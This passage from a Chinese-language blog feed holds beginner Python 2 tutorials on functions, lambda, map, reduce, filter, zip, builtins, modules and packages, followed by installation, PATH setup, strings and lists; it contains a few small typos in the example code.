&quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><p>全局变量：在函数的内外都能用，变量前加global<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        global a</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><h1 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h1><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def add(x,y):</span><br><span class="line">      a = x+y</span><br><span class="line">      print a</span><br><span class="line"></span><br><span class="line">add（3,5）</span><br></pre></td></tr></table></figure><p>引入lambda函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = lambda  x,y  :  x+y</span><br><span class="line"></span><br><span class="line">add( 3,5 )</span><br></pre></td></tr></table></figure></p><p>lambda函数是一个只用一行就能解决问题的函数。</p><h5 id="lambda函数的使用方法："><a href="#lambda函数的使用方法：" class="headerlink" title="lambda函数的使用方法："></a>lambda函数的使用方法：</h5><p>在lambda函数后面直接加变量，变量后直接冒号，冒号后面是表达式，完美解决<br>来个表达式</p><p>lambda arg1,arg2,….,argn : expression using arguments</p><h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><h5 id="使用方法：-map-函数，序列对象"><a href="#使用方法：-map-函数，序列对象" class="headerlink" title="使用方法： map(函数，序列对象)"></a>使用方法： map(函数，序列对象)</h5><p>比如0-100的平方数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(101)</span><br><span class="line"></span><br><span class="line">map( lambda  x :  x**2,numbers)</span><br></pre></td></tr></table></figure></p><p>另一个方法 <code>[ x**2  for  x  in  numbers ]</code></p><h3 id="reduce函数"><a href="#reduce函数" class="headerlink" title="reduce函数"></a>reduce函数</h3><p>reduce()函数也是Python内置的一个高阶函数。</p><p>reduce()函数接收的参数和 map()类似，一个函数 f，一个list，但行为和 map()不同，reduce()传入的函数 f 必须接收两个参数，reduce()对list的每个元素反复调用函数f，并返回最终结果值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x, y):</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure></p><p>调用 <strong>reduce(f, [1, 3, 5, 7, 9])</strong>时，reduce函数将做如下计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先计算头两个元素：f(1, 3)，结果为4；</span><br><span class="line">再把结果和第3个元素计算：f(4, 5)，结果为9；</span><br><span class="line">再把结果和第4个元素计算：f(9, 7)，结果为16；</span><br><span class="line">再把结果和第5个元素计算：f(16, 9)，结果为25；</span><br><span class="line">由于没有更多的元素了，计算结束，返回结果25。</span><br></pre></td></tr></table></figure></p><p>reduce()还可以接收第3个可选参数，作为计算的初始值。如果把初始值设为100，计算：</p><p>reduce(f, [1,3,5,7,9], 100)</p><p>结果将变为125，因为第一轮计算是：</p><p>计算初始值和第一个元素：f(100, 1)，结果为101。</p><h3 id="filter函数-过滤器"><a href="#filter函数-过滤器" class="headerlink" title="filter函数:过滤器"></a>filter函数:过滤器</h3><h5 id="用法：filter-函数-序列对象"><a href="#用法：filter-函数-序列对象" class="headerlink" title="用法：filter(函数,序列对象)"></a>用法：filter(函数,序列对象)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(-2,11)</span><br><span class="line"></span><br><span class="line">print   numbers</span><br><span class="line"></span><br><span class="line">[-2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class="line"></span><br><span class="line">filter( lambda x:x&gt;5,numbers)</span><br><span class="line"></span><br><span class="line">[6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><h3 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h3><p>zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）。若传入参数的长度不等，则返回list的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）。</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line"></span><br><span class="line">b = [4,5,6]</span><br><span class="line"></span><br><span class="line"> zip(a,b)</span><br><span class="line"></span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure></p><h5 id="长度不等时，取长度最小的"><a href="#长度不等时，取长度最小的" class="headerlink" title="长度不等时，取长度最小的"></a>长度不等时，取长度最小的</h5><p>c = ‘HELL0’</p><p> d = ‘look’</p><p>zip(c,d)</p><p>[(‘H’, ‘l’), (‘E’, ‘o’), (‘L’, ‘o’), (‘L’, ‘k’)</p><h5 id="常用的是构造字典"><a href="#常用的是构造字典" class="headerlink" title="常用的是构造字典"></a>常用的是构造字典</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url1 =  [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]</span><br><span class="line"></span><br><span class="line">url2 =  [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;]</span><br><span class="line"></span><br><span class="line">url3 =  zip(url1,url2)</span><br></pre></td></tr></table></figure><h3 id="abs函数"><a href="#abs函数" class="headerlink" title="abs函数"></a>abs函数</h3><h5 id="abs-函数返回数字的绝对值。"><a href="#abs-函数返回数字的绝对值。" class="headerlink" title="abs() 函数返回数字的绝对值。"></a>abs() 函数返回数字的绝对值。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">print &quot;abs(-45) : &quot;, abs(-45)</span><br><span class="line">print &quot;abs(100.12) : &quot;, abs(100.12)</span><br><span class="line">print &quot;abs(119L) : &quot;, abs(119L)</span><br></pre></td></tr></table></figure><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abs(-45) :  45</span><br><span class="line">abs(100.12) :  100.12</span><br><span class="line">abs(119L) :  119</span><br></pre></td></tr></table></figure></p><h3 id="divmod-函数"><a href="#divmod-函数" class="headerlink" title="divmod() 函数"></a>divmod() 函数</h3><p>python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b)。</p><h5 id="divmod-a-b"><a href="#divmod-a-b" class="headerlink" title="divmod(a, b)"></a>divmod(a, b)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">divmod(7, 2)</span><br><span class="line"></span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">divmod(8, 2)</span><br><span class="line"></span><br><span class="line">(4, 0)</span><br></pre></td></tr></table></figure><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input() 函数"></a>input() 函数</h3><p>Python3.x 中 input() 函数接受一个标准输入数据，返回为 string 类型。</p><p>Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入。</p><p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input() 直接读取控制台的输入（任何类型的输入它都可以接收）除非对 input() 有特别需要，否则一般情况下推荐使用 raw_input() 来与用户交互。</p><h5 id="input-prompt"><a href="#input-prompt" class="headerlink" title="input([prompt])"></a>input([prompt])</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;input:&quot;)</span><br><span class="line"></span><br><span class="line">input:123  </span><br><span class="line"></span><br><span class="line">type(a)   </span><br><span class="line"></span><br><span class="line">type &apos;int&apos;</span><br></pre></td></tr></table></figure><h3 id="open-函数"><a href="#open-函数" class="headerlink" title="open() 函数"></a>open() 函数</h3><p>open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。</p><h5 id="open（“-name”-”mode”）"><a href="#open（“-name”-”mode”）" class="headerlink" title="open（“$name”,”mode”）"></a>open（“$name”,”mode”）</h5><h5 id="file-对象方法"><a href="#file-对象方法" class="headerlink" title="file 对象方法"></a>file 对象方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file.read([size]) size未指定则返回整个文件,如果文件大小&gt;2倍内存则有问题.f.read()读到文件尾时返回&quot;&quot;(空字串)</span><br><span class="line"></span><br><span class="line">file.readline() 返回一行</span><br><span class="line"></span><br><span class="line">file.readlines([size]) 返回包含size行的列表,size 未指定则返回全部行</span><br><span class="line"></span><br><span class="line">for line in f: print line #通过循环访问</span><br><span class="line"></span><br><span class="line">f.write(&quot;hello\n&quot;) #如果要写入字符串以外的数据,先将他转换为字符串.</span><br><span class="line"></span><br><span class="line">f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的比特数).</span><br><span class="line"></span><br><span class="line">f.close() 关闭文件</span><br></pre></td></tr></table></figure><h3 id="staticmethod-函数"><a href="#staticmethod-函数" class="headerlink" title="staticmethod() 函数"></a>staticmethod() 函数</h3><p>python staticmethod 返回函数的静态方法。</p><p>该方法不强制要求传递参数</p><h3 id="all-函数"><a href="#all-函数" class="headerlink" title="all() 函数"></a>all() 函数</h3><p>all() 函数用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</p><p>元素除了是 0、空、FALSE 外都算 TRUE。iterable – 元组或列表。</p><h5 id="比如"><a href="#比如" class="headerlink" title="比如"></a>比如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;])  # 列表list，元素都不为空或0</span><br><span class="line"></span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;&apos;, &apos;d&apos;])   # 列表list，存在一个为空的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">all((0, 1, 2, 3))          # 元组tuple，存在一个为0的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"> all([])             # 空列表</span><br><span class="line"></span><br><span class="line">True </span><br><span class="line"></span><br><span class="line">all(())             # 空元组</span><br><span class="line"></span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate() 函数"></a>enumerate() 函数</h3><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p><p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seasons = [&apos;Spring&apos;, &apos;Summer&apos;, &apos;Fall&apos;, &apos;Winter&apos;]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons))</span><br><span class="line"></span><br><span class="line">[(0, &apos;Spring&apos;), (1, &apos;Summer&apos;), (2, &apos;Fall&apos;), (3, &apos;Winter&apos;)]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons, start=1))       # 小标从 1 开始</span><br><span class="line">[(1, &apos;Spring&apos;), (2, &apos;Summer&apos;), (3, &apos;Fall&apos;), (4, &apos;Winter&apos;)]</span><br></pre></td></tr></table></figure></p><h3 id="tuple-方法"><a href="#tuple-方法" class="headerlink" title="tuple()方法"></a>tuple()方法</h3><p>元组 tuple() 函数将列表转换为元组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tuple(&#123;1:2,3:4&#125;)    #针对字典 会返回字典的key组成的tuple</span><br><span class="line"></span><br><span class="line">(1, 3)</span><br><span class="line"></span><br><span class="line">tuple([1,2,3,4])</span><br><span class="line"></span><br><span class="line">(1, 2, 3, 4)</span><br></pre></td></tr></table></figure></p><h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile() 函数"></a>compile() 函数</h3><p>compile() 函数将一个字符串编译为字节代码。</p><h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>返回表达式执行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;3 * 4 + 5&quot;</span><br><span class="line"></span><br><span class="line">a = compile(str,&apos;&apos;,&apos;eval&apos;)</span><br><span class="line"></span><br><span class="line">eval(a)</span><br></pre></td></tr></table></figure></p><h3 id="dict-函数"><a href="#dict-函数" class="headerlink" title="dict() 函数"></a>dict() 函数</h3><p>dict() 函数用于创建一个字典。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict()                        # 创建空字典</span><br><span class="line"></span><br><span class="line"> dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;)     # 传入关键字</span><br><span class="line"></span><br><span class="line">dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3]))   # 映射函数方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; </span><br><span class="line"></span><br><span class="line">dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)])    # 可迭代对象方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="file函数"><a href="#file函数" class="headerlink" title="file函数"></a>file函数</h3><p><strong>file()</strong> 函数用于创建一个 file 对象，它有一个别名叫open()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = file(&apos;test.txt&apos;)</span><br><span class="line"></span><br><span class="line">f.read()</span><br><span class="line"></span><br><span class="line">&apos;RUNOOB1\nRUNOOB2\n&apos;</span><br></pre></td></tr></table></figure></p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在Python中有一个概念叫做模块（module），这个和C语言中的头文件以及Java中的包很类似，比如在Python中要调用sqrt函数，必须用import关键字引入math这个模块</p><h3 id="如何引入模块"><a href="#如何引入模块" class="headerlink" title="如何引入模块"></a>如何引入模块</h3><p>四种方法：</p><h5 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv</span><br></pre></td></tr></table></figure><h5 id="只导入我们要用到的"><a href="#只导入我们要用到的" class="headerlink" title="只导入我们要用到的"></a>只导入我们要用到的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">print argv</span><br></pre></td></tr></table></figure><h5 id="模块名太长，可以起个别名"><a href="#模块名太长，可以起个别名" class="headerlink" title="模块名太长，可以起个别名"></a>模块名太长，可以起个别名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys as s</span><br><span class="line"></span><br><span class="line">print s.argv</span><br></pre></td></tr></table></figure><h5 id="从模块中导入所有"><a href="#从模块中导入所有" class="headerlink" title="从模块中导入所有"></a>从模块中导入所有</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">print path #输出sys模块中的path</span><br></pre></td></tr></table></figure><h5 id="定义一个自己的模块"><a href="#定义一个自己的模块" class="headerlink" title="定义一个自己的模块"></a>定义一个自己的模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在目录下创建一个myself.py作为模块</span><br><span class="line"></span><br><span class="line">#encoding=utf-8</span><br><span class="line">a =  &quot;just do it&quot;</span><br></pre></td></tr></table></figure><p>接下来，创建一个py，引入这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import myself</span><br><span class="line">print myself.a</span><br></pre></td></tr></table></figure></p><p>如果在不同目录下，就要用到sys模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> import sys</span><br><span class="line"></span><br><span class="line">sys.path.append(&quot;C:\Users\20148\Desktop\myself.py&quot;)</span><br></pre></td></tr></table></figure></p><p>用这种方法告诉Python解释器，我写的文件在哪里</p><p>可以将myself.py改造为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        return &quot;just  do it!!!&quot;</span><br><span class="line"></span><br><span class="line">if ____name__ _== &apos;__main__&apos;:</span><br><span class="line">        print  a()</span><br></pre></td></tr></table></figure></p><p>都是一个文件，我们可以把他当作程序执行，也可以当作模块引入</p><p>如果是程序执行的话，<code>__name__==&quot;__main__&quot;</code></p><p>如果是模块呢？<code>demo.__name__==“demo”</code>，即为模块的名称</p><p>如果是模块的引入，就不用写<code>if __name==&quot;__main__&quot;</code>了</p><h1 id="包and库"><a href="#包and库" class="headerlink" title="包and库"></a>包and库</h1><p>包(带 <strong>init</strong>.py 的文件夹)，一个包（就是熟悉的目录）里面有好多的模块（即为.py文件），库就更大了，一个Python的标准库有好多的包，包又有一堆的模块</p><p>建立一个叫gooann的目录，里面放两个py文件，一个a.py，一个b.py，再建立一个空文件<strong>init</strong>.py<br>a.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        print &apos;just  do it!!!&apos;</span><br></pre></td></tr></table></figure></p><p>b.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  b():</span><br><span class="line">        print &apos;hello world!!&apos;</span><br></pre></td></tr></table></figure></p><p>然后，在与gooann同级的目录中，创建一个c.py调用这个gooann的包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">import  gooann.a</span><br><span class="line">import  gooann.b</span><br><span class="line"></span><br><span class="line">gooann.a.a( )</span><br><span class="line"></span><br><span class="line">gooann.b.b( )</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-1</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-1/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-1/</id>
    <published>2018-08-15T07:25:45.000Z</published>
    <updated>2018-08-15T12:44:11.792Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="什么是Python"><a href="#什么是Python" class="headerlink" title="什么是Python"></a>什么是Python</h1><p>Python是一种面向对象、解释型计算机程序设计语言，Python语法简洁而清晰，具有丰富和强大的类库。它常被昵称为胶水语言，能够把用其他语言制作的各种模块(尤其是C/C++)很轻松地联结在一起。常见的一种应用情形是，使用Python快速生成程序的原型(有时甚至是程序的最终界面)，然后对其中有特别要求的部分，用更合适的语言改写</p><h1 id="Pyhton的安装"><a href="#Pyhton的安装" class="headerlink" title="Pyhton的安装"></a>Pyhton的安装</h1><p>Python官网：<a href="http://www.python.org/" target="_blank" rel="noopener">http://www.python.org/</a><br>Python文档下载地址：<a href="http://www.python.org/doc/" target="_blank" rel="noopener">www.python.org/doc/</a></p><h4 id="Unix-amp-Linux-平台安装-Python"><a href="#Unix-amp-Linux-平台安装-Python" class="headerlink" title="Unix &amp; Linux 平台安装 Python:"></a>Unix &amp; Linux 平台安装 Python:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开WEB浏览器访问http://www.python.org/download/</span><br><span class="line">选择适用于Unix/Linux的源码压缩包。</span><br><span class="line">下载及解压压缩包。</span><br><span class="line">如果你需要自定义一些选项修改Modules/Setup</span><br><span class="line">执行 ./configure 脚本</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>执行以上操作后，Python会安装在 /usr/local/bin 目录中，Python库安装在/usr/local/lib/pythonXX，XX为你使用的Python的版本号。 </p><h4 id="Window-平台安装-Python"><a href="#Window-平台安装-Python" class="headerlink" title="Window 平台安装 Python:"></a>Window 平台安装 Python:</h4><p>打开WEB浏览器访问<a href="http://www.python.org/download/" target="_blank" rel="noopener">http://www.python.org/download/</a><br>在下载列表中选择Window平台安装包，包格式为：python-XYZ.msi 文件 ， XYZ 为你要安装的版本号。<br>要使用安装程序 python-XYZ.msi, Windows系统必须支持Microsoft Installer 2.0搭配使用。只要保存安装文件到本地计算机，然后运行它，看看你的机器支持MSI。Windows XP和更高版本已经有MSI，很多老机器也可以安装MSI。<br>下载后，双击下载包，进入Python安装向导，安装非常简单，你只需要使用默认的设置一直点击”下一步”直到安装完成即可。</p><h1 id="环境变量的设置"><a href="#环境变量的设置" class="headerlink" title="环境变量的设置"></a>环境变量的设置</h1><h4 id="Unix-Linux-设置环境变量"><a href="#Unix-Linux-设置环境变量" class="headerlink" title="Unix/Linux 设置环境变量"></a>Unix/Linux 设置环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash shell下：export PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">sh、ksh shell 下：PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">csh   shell 下：  setenv PATH &quot;$PATH:/usr/local/bin/python&quot;</span><br></pre></td></tr></table></figure><h4 id="windows下环境变量设置"><a href="#windows下环境变量设置" class="headerlink" title="windows下环境变量设置"></a>windows下环境变量设置</h4><p><code>cmd下：输入path=%path%;$python的安装目录</code></p><h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><p>笔者安装的为Python2.7.14，以下均基于此版本</p><p>首先打开终端输入python即可打开终端解释器：</p><p>先来个hello  world  </p><p><code>print  “hello  world”</code></p><p>Python 可以使用引号( <strong>‘</strong> )、双引号( <strong>“</strong> )、三引号( <strong>‘’’</strong> 或 <strong>“””</strong> ) 来表示字符串，引号的开始与结束必须的相同类型的。其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。</p><p> <code>tpye()</code> :查看变量类型</p><p><code>len( )</code>: 查看字符串的长度</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>因为我们主要是用python写爬虫，所以字符串是必须学好的，主要对字符串进行索引、切片和取长度的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = &quot; believe  yourself , just do  it&quot;</span><br><span class="line"></span><br><span class="line">s[10]         &apos;o&apos;</span><br><span class="line"></span><br><span class="line">s[10:]        &apos;ourself , just do  it&apos;</span><br><span class="line"></span><br><span class="line">s[0:10]      &apos;believe  yo&apos;</span><br><span class="line"></span><br><span class="line">s[::-1]       把字符串倒过来</span><br></pre></td></tr></table></figure></p><p>【x:y:z]切片索引,x是左端,y是右端,z是步长,在[x,y)区间从左到右每隔z取值,默认z为1可以省略z参数.  步长的负号就是反向,从右到左取值. </p><p>合并字符串，用  +  号</p><h5 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h5><p>Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单：</p><p><code>u&#39;Hello World !&#39;</code></p><h5 id="以-encoding-指定的编码格式解码-string"><a href="#以-encoding-指定的编码格式解码-string" class="headerlink" title="以 encoding 指定的编码格式解码 string"></a>以 encoding 指定的编码格式解码 string</h5><p>string.decode(encoding=’UTF-8’, errors=’strict’)</p><h3 id="list列表"><a href="#list列表" class="headerlink" title="list列表[ ]"></a>list列表[ ]</h3><p>可以对列表进行字符串同样的操作，把字符串转换为列表 <code>list =  str.split( )</code></p><p>在列表末尾添加新的对象 ：append（）</p><p>移除列表中某个值的第一个匹配项 ：remove（）</p><p>将元组转换为列表 ：    